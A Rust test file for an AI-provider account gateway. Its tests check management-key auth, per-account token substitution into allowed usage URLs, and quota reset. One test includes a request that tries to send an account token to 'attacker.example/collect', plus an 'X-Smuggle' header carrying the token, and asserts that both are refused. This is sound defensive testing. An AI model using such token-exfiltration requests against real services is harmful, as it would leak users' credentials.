//! Port of tests/hub-management.test.ts.

mod common;

use common::*;
use relay_gateway::hub_management::{HubFetch, HubRequest, HubResponse};
use relay_gateway::proxy_router::{CooldownReason, PickContext};
use relay_gateway::{
    Account, AccountAuth, Provider, ProxyConfig, ServerOptions, Upstreams, UsageMap,
};
use serde_json::{Value, json};
use std::collections::HashSet;
use std::sync::{Arc, Mutex};

const KEY: &str = "relay-sec-hubtestkey";

fn signed_in(id: &str, name: &str, provider: Option<Provider>, auth: AccountAuth) -> Account {
    let mut account = named(id, name);
    account.provider = provider;
    account.auth = Some(AccountAuth {
        logged_in: true,
        ..auth
    });
    account
}

fn pool() -> Vec<Account> {
    vec![
        signed_in(
            "cl-1",
            "Vertex",
            None,
            AccountAuth {
                email: Some("c@example.com".into()),
                ..Default::default()
            },
        ),
        signed_in(
            "cx-1",
            "OpenAI · Codex",
            Some(Provider::Codex),
            AccountAuth {
                email: Some("x@example.com".into()),
                account_uuid: Some("chatgpt-acc-1".into()),
                subscription: Some("Plus".into()),
                ..Default::default()
            },
        ),
        signed_in(
            "ag-1",
            "Google",
            Some(Provider::Antigravity),
            AccountAuth {
                email: Some("g@example.com".into()),
                ..Default::default()
            },
        ),
        named("cl-2", "No sign-in"),
    ]
}

/// Records what the hub sends instead of sending it.
#[derive(Default)]
struct Recorder {
    sent: Mutex<Vec<HubRequest>>,
}

#[async_trait::async_trait]
impl HubFetch for Recorder {
    async fn fetch(&self, request: HubRequest) -> Result<HubResponse, String> {
        self.sent.lock().unwrap().push(request);
        Ok(HubResponse {
            status: 200,
            text: json!({ "five_hour": { "utilization": 12, "resets_at": null } }).to_string(),
        })
    }
}

async fn hub() -> (Gateway, Arc<Recorder>) {
    let recorder = Arc::new(Recorder::default());
    let config = ProxyConfig {
        api_key: Some(KEY.into()),
        ..config()
    };
    let hooks = Hooks::new(pool()).credential(|a| async move { Some(format!("token-{}", a.id)) });
    let gateway = Gateway::start_with(
        config,
        hooks,
        Upstreams::default(),
        ServerOptions {
            hub_fetch: Some(recorder.clone()),
            ..Default::default()
        },
    )
    .await;
    (gateway, recorder)
}

async fn call(gateway: &Gateway, path: &str, body: Option<Value>, key: &str) -> Answer {
    let auth = format!("Bearer {key}");
    let extra = [
        ("authorization", auth.as_str()),
        ("content-type", "application/json"),
    ];
    let path = format!("/v0/management/{path}");
    match body {
        None => request(gateway.port, "GET", &path, &extra, "").await,
        Some(body) => request(gateway.port, "POST", &path, &extra, &body.to_string()).await,
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_usage_dashboard_lists_the_pools_claude_and_codex_accounts_with_the_gateways_key() {
    let (gateway, _) = hub().await;
    assert_eq!(
        call(&gateway, "auth-files", None, "wrong-key").await.status,
        401
    );
    let response = call(&gateway, "auth-files", None, KEY).await;
    assert_eq!(response.status, 200);
    let files = response.json()["files"].as_array().unwrap().clone();
    // Antigravity has no usage endpoint here, and an account without a sign-in has no token.
    assert_eq!(
        files
            .iter()
            .map(|f| json!([
                f["id"],
                f["auth_index"],
                f["provider"],
                f["email"],
                f["disabled"]
            ]))
            .collect::<Vec<_>>(),
        [
            json!(["cl-1", "cl-1", "claude", "c@example.com", false]),
            json!(["cx-1", "cx-1", "codex", "x@example.com", false]),
        ]
    );
    assert_eq!(
        files[1]["id_token"],
        json!({ "chatgpt_account_id": "chatgpt-acc-1", "plan_type": "plus" })
    );
    gateway.stop().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn api_call_sends_the_accounts_own_token_to_its_providers_usage_request_and_nothing_else() {
    let (gateway, recorder) = hub().await;
    let usage = call(
        &gateway,
        "api-call",
        Some(json!({
            "auth_index": "cl-1",
            "method": "GET",
            "url": "https://api.anthropic.com/api/oauth/usage",
            "header": { "Authorization": "Bearer $TOKEN$", "anthropic-beta": "oauth-2025-04-20", "X-Smuggle": "$TOKEN$" },
        })),
        KEY,
    )
    .await;
    assert_eq!(usage.status, 200);
    assert_eq!(
        usage.json(),
        json!({ "status_code": 200, "body": json!({ "five_hour": { "utilization": 12, "resets_at": null } }).to_string() })
    );
    let sent = recorder.sent.lock().unwrap().clone();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].url, "https://api.anthropic.com/api/oauth/usage");
    assert_eq!(
        sent[0].headers,
        [
            ("Authorization".to_string(), "Bearer token-cl-1".to_string()),
            ("anthropic-beta".to_string(), "oauth-2025-04-20".to_string()),
        ]
    );
    // Codex: its ChatGPT usage and reset credits, with its own token.
    let consume = call(
        &gateway,
        "api-call",
        Some(json!({
            "auth_index": "cx-1",
            "method": "POST",
            "url": "https://chatgpt.com/backend-api/wham/rate-limit-reset-credits/consume",
            "header": { "Authorization": "Bearer $TOKEN$", "Chatgpt-Account-Id": "chatgpt-acc-1" },
            "data": "{\"credit_id\":\"c1\"}",
        })),
        KEY,
    )
    .await;
    assert_eq!(consume.status, 200);
    let sent = recorder.sent.lock().unwrap().clone();
    assert_eq!(
        sent[1].headers[0],
        ("Authorization".to_string(), "Bearer token-cx-1".to_string())
    );
    assert_eq!(sent[1].body.as_deref(), Some("{\"credit_id\":\"c1\"}"));
    // Any other address, another provider's address, or an unknown account: refused, nothing sent.
    for body in [
        json!({ "auth_index": "cl-1", "url": "https://attacker.example/collect", "header": { "Authorization": "Bearer $TOKEN$" } }),
        json!({ "auth_index": "cl-1", "url": "https://chatgpt.com/backend-api/wham/usage" }),
        json!({ "auth_index": "cx-1", "method": "DELETE", "url": "https://chatgpt.com/backend-api/wham/usage" }),
        json!({ "auth_index": "ag-1", "url": "https://api.anthropic.com/api/oauth/usage" }),
        json!({ "auth_index": "nope", "url": "https://api.anthropic.com/api/oauth/usage" }),
    ] {
        assert_ne!(
            call(&gateway, "api-call", Some(body.clone()), KEY)
                .await
                .status,
            200,
            "{body}"
        );
    }
    assert_eq!(recorder.sent.lock().unwrap().len(), 2);
    gateway.stop().await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn reset_quota_lets_the_account_be_picked_again_at_once() {
    let (gateway, _) = hub().await;
    let codex = pool()[1].clone();
    gateway
        .server
        .router()
        .mark_unavailable("cx-1", 60_000, CooldownReason::Limit);
    let select = |gateway: &Gateway| {
        gateway.server.router().select_account(
            None,
            std::slice::from_ref(&codex),
            &UsageMap::new(),
            Some(Provider::Codex),
            &HashSet::new(),
            None,
            &PickContext::default(),
        )
    };
    assert!(select(&gateway).is_err());
    let response = call(
        &gateway,
        "reset-quota",
        Some(json!({ "auth_index": "cx-1" })),
        KEY,
    )
    .await;
    assert_eq!(response.status, 200);
    assert_eq!(select(&gateway).unwrap().account.id, "cx-1");
    assert_eq!(call(&gateway, "unknown-call", None, KEY).await.status, 404);
    gateway.stop().await;
}
